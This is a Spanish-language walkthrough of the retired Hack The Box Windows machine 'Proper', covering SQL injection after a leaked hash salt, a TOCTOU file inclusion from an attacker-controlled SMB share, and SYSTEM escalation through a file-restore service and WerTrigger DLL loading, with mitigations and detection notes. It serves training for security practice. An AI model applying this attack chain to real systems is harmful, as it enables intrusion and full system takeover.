---
machine: Proper
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, iis, sqli, keyed-hash, toctou, smb, named-pipe, wertrigger, privesc]
---

# Proper — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La petición AJAX a `Products-Ajax.php` usa `order` y un hash `h`; si falta un parámetro, un crash de PHP revela el código y la sal `SECURE_PARAM_SALT` con la que se firma. Hay que recalcular el hash en cada petición (SQLmap con `--eval` o scripting propio) para explotar la SQLi, crackear los hashes y entrar en `/licenses`. Allí un LFI/RFI con una condición de carrera (TOCTOU) sobre un recurso SMB permite ejecutar código como `web`. Para root se analiza el servicio `Cleanup` (NSSM + `server.exe`/`client.exe` con named pipes): el cliente restaura archivos como SYSTEM y permite escritura arbitraria; con WerTrigger se fuerza a Windows Error Reporting a cargar una DLL y se obtiene SYSTEM. En *Beyond Root* se documentan otras rutas, incluida CVE-2021-1732.

## Reconocimiento

```bash
nmap -Pn -sCV -p80 <IP>
```

- `80`: Microsoft IIS 10.0.

```bash
echo '<IP> proper.htb' | sudo tee -a /etc/hosts
gobuster dir -u http://proper.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
```

## Enumeración

El sitio es una aplicación de licencias. La página principal carga `Products-Ajax.php` con `order` y `h`; `order=id desc` se usa directamente en la consulta. El valor `h` parece un hash con clave. Al omitir un parámetro (por ejemplo `order`), PHP falla y el mensaje de error muestra el código con `SECURE_PARAM_SALT`.

Con la clave se puede recalcular el hash para cada petición. `sqlmap` lo automatiza con `--eval`, y también se puede hacer con un script que firme cada parámetro.

El hash se recalcula en cada petición con un script propio; `sqlmap` puede automatizarlo con `--eval`, pero el algoritmo debe replicar exactamente el del servidor.

La SQLi vuelca usuarios y hashes; el crackeo da acceso a `/licenses`.

## Foothold

`/licenses` incluye un parámetro de plantilla o idioma que incluye archivos. La inclusión se puede apuntar a un recurso SMB propio. La aplicación lee el archivo dos veces (comprobación y uso), lo que permite un TOCTOU: la primera lectura devuelve un archivo inocuo y la segunda un payload PHP, que se ejecuta como `web`.

```text
\\<LHOST>\share\file.php
```

## Movimiento lateral

No hay otro host. `web` enumera servicios y permisos. WinPEAS muestra el servicio `Cleanup`, que ejecuta `C:\Program Files\Cleanup\server.exe` mediante NSSM. El cliente y el servidor se comunican por el named pipe `cleanupPipe`; el servidor corre como SYSTEM.

## Escalada de privilegios

El cliente `client.exe` cifra los archivos de `Downloads` y los guarda en `C:\ProgramData\Cleanup` con el nombre en base64. Al restaurar, el servidor escribe el archivo en la ruta indicada por ese nombre, con privilegios de SYSTEM. Manipulando el nombre en base64 se escribe un archivo arbitrario.

Se usa esa escritura para colocar `phoneinfo.dll` en `System32` y se provoca un fallo controlado para que Windows Error Reporting cargue la DLL como SYSTEM.

```powershell
C:\Program Files\Cleanup\client.exe -R C:\Windows\System32\<FILE>
```

En *Beyond Root* se muestran rutas alternativas de lectura y escritura arbitraria, y CVE-2021-1732 como vía adicional de elevación.

## Evidencia

- `Products-Ajax.php` con `order` y `h`, y crash que revela `SECURE_PARAM_SALT`.
- SQLi reproducida con el hash recalculado y hashes crackeados.
- Acceso a `/licenses` y LFI/RFI con recurso SMB.
- TOCTOU y ejecución de PHP como `web`.
- Servicio `Cleanup` y named pipe `cleanupPipe`.
- Escritura arbitraria como SYSTEM y `phoneinfo.dll` cargada por WER.
- `whoami` como `nt authority\system`.

## Lecciones aprendidas

- Firmar un parámetro no evita la inyección si la clave se filtra.
- Un hash con clave debe recalcularse en cada petición; eso no lo hace seguro.
- Un TOCTOU entre comprobación y uso convierte una inclusión en RCE.
- Un servicio con named pipes y restauración de archivos puede escribir como SYSTEM.
- WerTrigger es una vía genérica para cargar una DLL desde un proceso privilegiado.

## Mitigaciones y detección

- Parametrizar las consultas y no confiar en hashes para sanear SQL.
- No revelar claves ni errores internos; registrar sin detalles.
- Validar rutas y usar identificadores; evitar comprobaciones separadas del uso.
- Restringir el servicio Cleanup y validar los nombres restaurados.
- Bloquear la carga de DLL desde rutas de usuario y revisar WerTrigger.
- Alertar de peticiones con `h` inválido, escrituras en System32 y crashes de WER.

## Referencias

- [0xdf — Proper](https://0xdf.gitlab.io/2021/08/21/htb-proper.html)
- [IppSec — Proper](https://www.youtube.com/watch?v=yqNSTM9oGZE)
- [Hack The Box — Proper](https://app.hackthebox.com/machines/proper)
- [NVD — CVE-2021-1732](https://nvd.nist.gov/vuln/detail/CVE-2021-1732)
- [Knowledge — WerTrigger y elevación a SYSTEM](../../../knowledge/windows/wertrigger-privesc.md)
